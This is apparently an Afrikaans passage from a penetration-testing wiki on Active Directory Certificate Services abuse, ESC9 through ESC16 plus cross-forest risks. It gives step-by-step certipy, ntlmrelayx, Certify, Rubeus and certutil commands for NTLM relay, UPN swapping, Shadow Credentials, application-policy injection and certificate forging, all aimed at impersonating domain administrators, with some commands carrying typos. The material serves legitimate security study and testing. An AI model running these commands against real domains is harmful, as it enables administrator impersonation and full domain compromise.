Die versoek vir 'n sertifikaat word standaard deur Certipy gemaak gebaseer op die sjabloon `Machine` of `User`, bepaal deur of die rekeningnaam wat doorgestuur word op `$` eindig. 'n Alternatiewe sjabloon kan gespesifiseer word met die `-template` parameter.

'n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om authentication af te dwing. Wanneer met domain controllers gewerk word, is die spesifikasie van `-template DomainController` nodig.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Geen Sekuriteitsuitbreiding - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, verwys na as ESC9, voorkom die inkorporering van die **nuwe `szOID_NTDS_CA_SECURITY_EXT` sekuriteitsuitbreiding** in 'n sertifikaat. Hierdie vlag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` gestel is (die verstekinstelling), in teenstelling met `2`. Dit word veral belangrik in scenario's waar 'n swakker sertifikaat-toewysing vir Kerberos of Schannel uitgebuit kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sou verander nie.

Die toestande waaronder hierdie vlag se instelling betekenisvol raak sluit in:

- `StrongCertificateBindingEnforcement` is nie op `2` gestel nie (met die verstek `1`), of `CertificateMappingMethods` sluit die `UPN` vlag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag binne die `msPKI-Enrollment-Flag` instelling.
- Enige client authentication EKU is deur die sertifikaat gespesifiseer.
- `GenericWrite` toestemmings is beskikbaar oor enige rekening om 'n ander te kompromitteer.

### Misbruikscenario

Gestel `John@corp.local` het `GenericWrite` toestemmings oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9` sertifikaatsjabloon, waarvoor `Jane@corp.local` mag registreer, is gekonfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag in sy `msPKI-Enrollment-Flag` instelling.

Aanvanklik word `Jane` se hash verkry deur Shadow Credentials, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Gevolglik word `Jane` se `userPrincipalName` gewysig na `Administrator`, en die `@corp.local` domeingedeelte word doelbewus weggelaat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie die beperkings nie, aangesien `Administrator@corp.local` onderskei bly as `Administrator` se `userPrincipalName`.

Daarna word die `ESC9` sertifikaattemplaat, gemerk as kwesbaar, versoek as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Dit word opgemerk dat die sertifikaat se `userPrincipalName` die `Administrator` weerspieël, sonder enige “object SID”.

`Jane` se `userPrincipalName` word dan teruggestel na haar oorspronklike, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Wanneer aanmelding met die uitgereikte sertifikaat probeer word, lewer dit nou die NT hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Swak Sertifikaatkoppelings - ESC10

### Verduideliking

Twee registersleutelwaardes op die domeinbeheerder word deur ESC10 verwys:

- Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen ingestel op `0x1F`.
- Die verstekinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.

### Geval 1

Wanneer `StrongCertificateBindingEnforcement` ingestel is op `0`.

### Geval 2

As `CertificateMappingMethods` die `UPN` bit (`0x4`) insluit.

### Misbruik Geval 1

Met `StrongCertificateBindingEnforcement` ingestel op `0`, kan 'n rekening A met `GenericWrite` magte misbruik word om enige rekening B te kompromitteer.

Byvoorbeeld, met `GenericWrite` regte oor `Jane@corp.local` beoog 'n aanvaller om `Administrator@corp.local` te kompromitteer. Die prosedure weerspieël ESC9 en laat toe dat enige sertifikaat-sjabloon gebruik word.

Aanvanklik word `Jane`'s hash verkry met Shadow Credentials deur die `GenericWrite` uit te buit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` na `Administrator` verander, opsetlik die `@corp.local` gedeelte weggelaat om 'n beperkingsoortreding te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierna word as `Jane` 'n sertifikaat aangevra wat kliëntverifikasie moontlik maak, met die standaard `User`-sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan teruggestel na die oorspronklike, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Deur met die verkryde sertifikaat te verifieer, sal dit die NT-hash van `Administrator@corp.local` oplewer, wat vereis dat die domein in die kommando gespesifiseer word omdat die sertifikaat geen domeinbesonderhede bevat nie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN` bitvlag (`0x4`) bevat, kan 'n rekening A met `GenericWrite`-toestemmings enige rekening B kompromitteer wat 'n `userPrincipalName`-eienskap ontbreek, insluitend masjienrekeninge en die ingeboude domeinadministrateur `Administrator`.

Hier is die doel om `DC$@corp.local` te kompromitteer, beginnende met die verkryging van `Jane` se hash deur Shadow Credentials, deur gebruik te maak van die `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan na `DC$@corp.local` gestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n Sertifikaat vir kliëntverifikasie word as `Jane` aangevra met die verstek `User`-sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Die `userPrincipalName` van `Jane` word na hierdie proses na die oorspronklike waarde teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om via Schannel te verifieer, word Certipy se `-ldap-shell` opsie gebruik, wat 'n suksesvolle verifikasie aandui as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur die LDAP shell maak opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD)-aanvalle moontlik en kan die domain controller kompromitteer.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook tot enige gebruikersrekening wat nie 'n `userPrincipalName` het nie of waar dit nie ooreenstem met die `sAMAccountName` nie, met die verstek `Administrator@corp.local` as 'n primêre teiken vanweë sy verhoogde LDAP-voorregte en die afwesigheid van 'n `userPrincipalName` by verstek.

## Relaying NTLM to ICPR - ESC11

### Explanation

As die CA-server nie gekonfigureer is met `IF_ENFORCEENCRYPTICERTREQUEST` nie, maak dit NTLM-relay-aanvalle sonder ondertekening via die RPC-diens moontlik. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Jy kan `certipy` gebruik om te kontroleer of `Enforce Encryption for Requests` uitgeskakel is, en certipy sal `ESC11` kwesbaarhede wys.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Misbruikscenario

Dit moet 'n relay server opstel:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Let wel: Vir domain controllers moet ons `-template` in DomainController spesifiseer.

Of gebruik [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Certificate Authority opstel om dit op 'n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

As 'n USB-toestel aan die CA-bediener gekoppel is via 'n USB-poort, of 'n USB-toestelserver indien die CA-bediener 'n virtuele masjien is, is 'n authentication key (soms verwys as 'n "password") nodig vir die Key Storage Provider om sleutels in die YubiHSM te genereer en te gebruik.

Hierdie authentication key/password word in die register gestoor onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in platteks.

Verwysing in [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Misbruikscenario

As die CA se private sleutel op 'n fisiese USB-toestel gestoor is en jy shell access het, is dit moontlik om die sleutel te herstel.

Eerstens moet jy die CA-sertifikaat bekom (dit is publiek) en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Laastens gebruik die certutil `-sign` command om 'n nuwe arbitrêre sertifikaat te vervals deur die CA-sertifikaat en sy privaat sleutel te gebruik.

## OID Group Link Abuse - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy`-attribuut maak dit moontlik om die uitreikingbeleid by die sertifikaatsjabloon te voeg. Die `msPKI-Enterprise-Oid`-objekte wat verantwoordelik is vir die uitreik van beleide kan in die Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID-behouer gevind word. 'n Beleid kan aan 'n AD-groep gekoppel word deur die `msDS-OIDToGroupLink`-attribuut van hierdie objek te gebruik, wat 'n stelsel in staat stel om 'n gebruiker te magtig wat die sertifikaat voorlê asof hy 'n lid van die groep is. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Met ander woorde, wanneer 'n gebruiker toestemming het om 'n sertifikaat te registreer en die sertifikaat is gekoppel aan 'n OID-groep, kan die gebruiker die bevoegdhede van daardie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Misbruikscenario

Vind 'n gebruikerstoestemming wat jy kan gebruik met `certipy find` of `Certify.exe find /showAllPermissions`.

Indien `John` toestemming het om in te skryf vir `VulnerableTemplate`, kan die gebruiker die voorregte van die groep `VulnerableGroup` erf.

Alles wat nodig is, is om net die template te spesifiseer; die gebruiker sal 'n sertifikaat met OIDToGroupLink-regte kry.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kwetsbare Sertifikaat Hernuingskonfigurasie - ESC14

### Verduideliking

Die beskrywing by https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is buitengewoon deeglik. Hieronder is 'n aanhaling van die oorspronklike teks.

ESC14 spreek kwesbaarhede aan wat voortspruit uit "weak explicit certificate mapping", hoofsaaklik deur misbruik of onseker konfigurasie van die `altSecurityIdentities` attribuut op Active Directory-gebruikers- of rekenaarrekeninge. Hierdie veelwaarde attribuut laat administrateurs toe om handmatig X.509-sertifikate aan 'n AD-rekening te koppel vir autentikasiedoeleindes. Wanneer dit gevul is, kan hierdie eksplisiete koppelings die standaard sertifikaatkoppelingslogika buite werking stel, wat gewoonlik staatmaak op UPNs of DNS-name in die SAN van die sertifikaat, of die SID ingebed in die `szOID_NTDS_CA_SECURITY_EXT` sekuriteit-uitbreiding.

'n "Swak" koppeling ontstaan wanneer die stringwaarde wat binne die `altSecurityIdentities` attribuut gebruik word om 'n sertifikaat te identifiseer te breed is, maklik raaiselbaar is, op nie-unieke sertifikaatvelde staatmaak, of maklik-spoofbare sertifikaatkomponente gebruik. As 'n aanvaller 'n sertifikaat kan bekom of vervaardig waarvan die attribuutwaardes pas by so 'n swak gedefinieerde eksplisiete koppeling vir 'n bevoorregte rekening, kan hulle daardie sertifikaat gebruik om as daardie rekening te autentiseer en dit te imiteer.

Voorbeelde van potensieel swak `altSecurityIdentities` koppelingsstringe sluit in:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. 'n Aanvaller kan moontlik 'n sertifikaat met hierdie CN van 'n minder veilige bron bekom.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

Die `altSecurityIdentities` attribuut ondersteun verskeie formate vir koppelings, soos:

- `X509:<I>IssuerDN<S>SubjectDN` (koppel volgens die volledige Issuer en Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (koppel volgens die sertifikaat se Subject Key Identifier-uitbreidingswaarde)
- `X509:<SR>SerialNumberBackedByIssuerDN` (koppel volgens seriële nommer, implisiet gekwalifiseer deur die Issuer DN) - dit is nie 'n standaardformaat nie; gewoonlik is dit `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (koppel volgens 'n RFC822-naam, tipies 'n e-posadres, uit die SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (koppel volgens 'n SHA1-hash van die sertifikaat se rou publieke sleutel - oor die algemeen sterk)

Die veiligheid van hierdie koppelings hang sterk af van die spesifisiteit, uniekheid en kriptografiese sterkte van die gekose sertifikaatidentifiseerders wat in die koppelstring gebruik word. Selfs met sterk sertifikaatbindingsmodusse geaktiveer op Domain Controllers (wat hoofsaaklik implisiete koppelings gebaseer op SAN UPNs/DNS en die SID-uitbreiding beïnvloed), kan 'n swak geconfigureerde `altSecurityIdentities` inskrywing steeds 'n direkte pad tot imitasiemisbruik bied as die koppelingslogika self gebrekkig of te permissief is.

### Misbruikscenario

ESC14 mik op **explicit certificate mappings** in Active Directory (AD), spesifiek die `altSecurityIdentities` attribuut. As hierdie attribuut gestel is (deur ontwerp of wankonfigurasie), kan aanvallers rekeninge imiteer deur sertifikate voor te lê wat by die koppeling pas.

#### Scenario A: Aanvaller kan skryf na `altSecurityIdentities`

**Voorvereiste**: Die aanvaller het skryfpermitte op die teikenrekening se `altSecurityIdentities` attribuut, of die reg om dit toe te ken in die vorm van een van die volgende permitte op die teiken AD-objek:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Teiken het swak koppeling via X509RFC822 (E-pos)

- **Voorvereiste**: Die teiken het 'n swak X509RFC822-koppeling in altSecurityIdentities. 'n Aanvaller kan die slagoffer se mail-attribuut stel om by die teiken se X509RFC822-naam te pas, 'n sertifikaat as die slagoffer registreer, en dit gebruik om as die teiken te autentiseer.

#### Scenario C: Teiken het X509IssuerSubject-koppeling

- **Voorvereiste**: Die teiken het 'n swak X509IssuerSubject eksplisiete koppeling in `altSecurityIdentities`. Die aanvaller kan die `cn` of `dNSHostName` attribuut op 'n slagoffer-prinsipaal stel om by die onderwerp van die teiken se X509IssuerSubject-koppeling te pas. Daarna kan die aanvaller 'n sertifikaat as die slagoffer registreer en daardie sertifikaat gebruik om as die teiken te autentiseer.

#### Scenario D: Teiken het X509SubjectOnly-koppeling

- **Voorvereiste**: Die teiken het 'n swak X509SubjectOnly eksplisiete koppeling in `altSecurityIdentities`. Die aanvaller kan die `cn` of `dNSHostName` attribuut op 'n slagoffer-prinsipaal stel om by die onderwerp van die teiken se X509SubjectOnly-koppeling te pas. Daarna kan die aanvaller 'n sertifikaat as die slagoffer registreer en daardie sertifikaat gebruik om as die teiken te autentiseer.

### konkrete operasies
#### Scenario A

Versoek 'n sertifikaat van die sertifikaatsjabloon `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Stoor en omskep die sertifikaat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Outentiseer (met die sertifikaat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Opruiming (opsioneel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Aansoekbeleid (CVE-2024-49019) - ESC15

### Verduideliking

Die beskrywing by https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is uiters deeglik. Hieronder is 'n aanhaling van die oorspronklike teks.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Misbruik

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy se `find` opdrag kan help om V1-sjablone te identifiseer wat moontlik vatbaar is vir ESC15 as die CA nie gepatch is nie.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direkte impersonasie via Schannel

**Step 1: Versoek 'n sertifikaat en injekteer die "Client Authentication" Application Policy en die teiken-UPN.** Aanvaller `attacker@corp.local` teiken `administrator@corp.local` deur die "WebServer" V1-sjabloon (wat 'n deur die inskrywer verskafde subject toelaat).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die kwesbare V1-sjabloon met "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inspuit die OID `1.3.6.1.5.5.7.3.2` in die Application Policies-uitbreiding van die CSR.
- `-upn 'administrator@corp.local'`: Stel die UPN in die SAN vir impersonasie.

**Stap 2: Outentiseer via Schannel (LDAPS) met behulp van die verkrygde sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Stap 1: Versoek 'n sertifikaat van 'n V1-sjabloon (met "Enrollee supplies subject"), deur die "Certificate Request Agent" Application Policy in te spuit.** Hierdie sertifikaat is vir die aanvaller (`attacker@corp.local`) om 'n enrollment agent te word. Geen UPN word hier vir die aanvaller se eie identiteit gespesifiseer nie, aangesien die doel die agent-vermoë is.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Voeg OID `1.3.6.1.4.1.311.20.2.1` in.

**Stap 2: Gebruik die "agent" sertifikaat om namens 'n geteikende bevoorregte gebruiker 'n sertifikaat aan te vra.** Dit is 'n ESC3-like stap, wat die sertifikaat van Stap 1 as die agent-sertifikaat gebruik.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Stap 3: Authentiseer as die bevoorregte gebruiker met die "on-behalf-of" sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Sekuriteitsuitbreiding Gedeaktiveer op CA (Globaal)-ESC16

### Verduideliking

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** verwys na die scenario waar, indien die konfigurasie van AD CS nie die insluiting van die **szOID_NTDS_CA_SECURITY_EXT** uitbreiding in alle sertifikate afdwing nie, 'n aanvaller dit kan uitbuit deur:

1. 'n sertifikaat versoek **sonder SID binding**.

2. Hierdie sertifikaat gebruik **vir verifikasie as enige rekening**, soos die nadoen van 'n hoë-privilege rekening (bv. a Domain Administrator).

Jy kan ook na hierdie artikel verwys om meer te leer oor die gedetaileerde beginsel: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Misbruik

Die volgende verwys na [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Click to see more detailed usage methods.

Om te identifiseer of die Active Directory Certificate Services (AD CS) omgewing kwesbaar is vir **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Stap 1: Lees aanvanklike UPN van die slagofferrekening (Opsioneel - vir herstel).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Stap 2: Werk die UPN van die slagofferrekening by na die `sAMAccountName` van die teiken-administrateur.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Stap 3: (Indien nodig) Verkry credentials vir die "victim" account (bv., via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Stap 4: Versoek 'n sertifikaat as die "victim" gebruiker vanaf _enige geskikte kliënt-authentiseringssjabloon_ (bv. "User") op die ESC16-vulnerable CA.** Omdat die CA kwesbaar is vir ESC16, sal dit outomaties die SID security extension uit die uitgereikte sertifikaat weglate, ongeag die sjabloon se spesifieke instellings vir hierdie uitbreiding. Stel die Kerberos credential cache omgewingsveranderlike (shell-opdrag):
```bash
export KRB5CCNAME=victim.ccache
```
Versoek dan die sertifikaat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Stap 5: Herstel die UPN van die "victim"-rekening.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Stap 6: Verifieer as die geteikende administrateur.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromittering van foreste met sertifikate, verduidelik in lydende vorm

### Breuk van bosvertroue deur gekompromitteerde CAs

Die konfigurasie vir **cross-forest enrollment** word relatief eenvoudig gemaak. Die **root CA certificate** van die resource forest word deur administrateurs **published to the account forests**, en die **enterprise CA** certificates van die resource forest word **added to the `NTAuthCertificates` and AIA containers in each account forest**. Ter verduideliking, hierdie reël verleen die **CA in the resource forest complete control** oor alle ander foreste waarvoor dit PKI bestuur. As hierdie CA deur aanvallers **compromised by attackers** sou word, kon sertifikate vir alle gebruikers in beide die resource- en account-foreste deur hulle **forged by them** word, en sodoende die sekuriteitsgrens van die bos gebreek word.

### Inskripsiebevoegdhede wat aan foreign principals toegeken word

In multi-forest omgewings moet daar versigtigheid toegepas word ten opsigte van Enterprise CAs wat **publish certificate templates** wat **Authenticated Users or foreign principals** (gebruikers/groepe ekstern tot die bos waaraan die Enterprise CA behoort) **enrollment and edit rights** toelaat.\
By authentisering oor ’n trust heen word die **Authenticated Users SID** deur AD by die gebruiker se token gevoeg. Dus, as ’n domein ’n Enterprise CA besit met ’n template wat **allows Authenticated Users enrollment rights**, kan ’n template moontlik deur ’n gebruiker van ’n ander bos **enrolled in by a user from a different forest** word. Net so, as **enrollment rights are explicitly granted to a foreign principal by a template**, word daarmee ’n **cross-forest access-control relationship is thereby created** geskep, wat ’n principal van een bos in staat stel om **enroll in a template from another forest**.

Beide scenario’s lei tot ’n groter aanvalsvlak van een bos na ’n ander. Die instellings van die certificate template kan deur ’n aanvaller uitgebuit word om addisionele voorregte in ’n vreemde domein te verkry.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
